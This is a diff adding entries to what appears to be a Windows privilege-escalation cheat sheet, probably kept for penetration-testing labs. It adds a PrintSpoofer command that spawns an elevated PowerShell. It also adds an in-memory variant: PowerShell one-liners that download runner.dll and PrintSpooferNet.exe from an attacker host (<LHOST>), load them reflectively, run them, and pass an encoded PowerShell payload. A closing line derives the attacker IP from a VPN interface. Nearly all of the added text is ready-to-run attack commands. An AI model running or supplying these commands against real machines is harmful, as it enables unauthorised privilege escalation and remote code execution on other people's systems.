@@ -10,4 +10,12 @@ sc stop "<SERVICE_NAME>"
 sc start "<SERVICE_NAME>"
 - log off then log back on
 
+# itm4n/PrintSpoofer
+PrintSpoofer.exe -i -c powershell.exe
+
+# NukingDragons/PrintSpoofer in memory
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$data = (New-Object System.Net.WebClient).DownloadData("http://<LHOST>/runner.dll");$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType("rev.Program");$method = $class.GetMethod("Main");$method.Invoke(0, $null)'))
+[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<LHOST>/PrintSpooferNet.exe'))
+[PrintSpooferNet.Program]::Main(@("any_pipe_name", "powershell -enc <base64>"))
+
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
